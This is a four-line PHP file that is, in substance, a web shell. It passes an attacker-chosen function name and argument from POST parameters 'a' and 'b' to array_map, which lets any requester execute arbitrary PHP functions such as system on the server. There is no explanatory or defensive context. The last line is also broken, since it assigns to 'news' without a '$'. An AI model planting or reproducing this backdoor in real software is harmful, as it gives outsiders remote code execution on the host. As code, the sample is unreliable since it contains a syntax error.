<?php
    $func = $_POST['a'];
    $arr = array($_POST['b']);
    news = array_map($func, $arr);
?>